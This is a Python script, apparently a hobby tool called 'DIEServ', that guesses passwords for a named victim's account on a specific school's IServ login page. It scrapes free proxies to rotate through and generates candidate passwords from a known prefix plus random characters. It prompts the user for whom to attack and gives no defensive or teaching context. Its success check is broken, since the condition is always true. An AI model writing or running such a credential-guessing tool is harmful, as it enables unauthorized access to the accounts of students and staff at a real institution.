import string
import random
from itertools import cycle

import pandas as pd
import requests
from bs4 import BeautifulSoup
from datetime import datetime




def random_generator(size=8, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for x in range(size))

def getProxies():
    res = requests.get("https://free-proxy-list.net/")
    proxies = pd.read_html(res.text)
    proxies = proxies[0][:-1]
    now = datetime.now()
    dt_string = now.strftime("-%d.%m.%Y-%H-%M")
    with open("proxies" + dt_string + ".txt", "w") as f:
        for index,row in proxies.iterrows():
            f.write("%s:%s\n" % (row["IP Address"], int(row["Port"])))

def getProxiesAsList(dt_string):
    with open("proxies" + dt_string + ".txt") as f:
        ip_addresses = f.read().splitlines()
        return ip_addresses

def checkKnown(dt_string, victim):
    with open("proxies" + dt_string + ".txt") as f:
        ip_addresses = f.read().splitlines()
    a = open("passes-known" + dt_string +  ".txt","r")
    file = [s.rstrip()for s in a.readlines()]
    for lines in file:
        user = victim
        password = lines
        combo = user + ":" + password
        url = "https://iserv-schiller-schule.de/iserv/login_check"
        with requests.Session() as s:
            values = {'_username': victim,
                      '_password': password}
            print("current account: " + combo)
            try:
                proxy_pool = cycle(ip_addresses)
                proxy = next(proxy_pool)
                r = requests.post(url, data=values, proxies={"http": proxy, "https": proxy})
            except:
                proxy = next(proxy_pool)
                r = requests.post(url, data=values, proxies={"http": proxy, "https": proxy})
            if "fehlgeschlagen" or "existiert" or "viele" in r.text:
                print("account " + combo + " isn't working!")
                soup = BeautifulSoup(r.text, 'html.parser')
                print("site returned: " + soup.find_all('div')[8].get_text().split("!")[0])
                print("current proxy: " + proxy)
                print("-----------------DIEServ----------------------")
            else:
                print("account " + combo + "is working!")


def methodKnownPassword():
    victim = str(input("Who do you want to attack? "))
    tries = int(input("How many times do  byou want to attack? "))
    firstPart = str(input("Whats the first part of your password? "))
    charsMissing = int(input("How many chars are missing? "))
    now = datetime.now()
    dt_string = now.strftime("-%d.%m.%Y-%H-%M")
    print("Generating passwords...")
    pwfile = open("passes-known" + dt_string +  ".txt","w")
    print("Scraping proxies...")
    getProxies()
    for x in range(tries):
        password = firstPart + random_generator(charsMissing)
        f = open("passes-known" + dt_string +  ".txt", "a")
        f.write(password + "\n")
        f.close()
    print("Done!")
    print("Starting checking...")
    checkKnown(dt_string, victim)
    print()





print("██████╗ ██╗███████╗███████╗███████╗██████╗ ██╗   ██╗")
print("██╔══██╗██║██╔════╝██╔════╝██╔════╝██╔══██╗██║   ██║")
print("██║  ██║██║█████╗  ███████╗█████╗  ██████╔╝██║   ██║")
print("██║  ██║██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝")
print("██████╔╝██║███████╗███████║███████╗██║  ██║ ╚████╔╝ ")
print("╚═════╝ ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ")
print("                                                    ")
method = str(input("How do you want to attack? [0] Brute [1] Pattern [2] KnownPassword [3] PassList "))

if method == "0":
    pass
elif method == "1":
    pass
elif method == "2":
    methodKnownPassword()
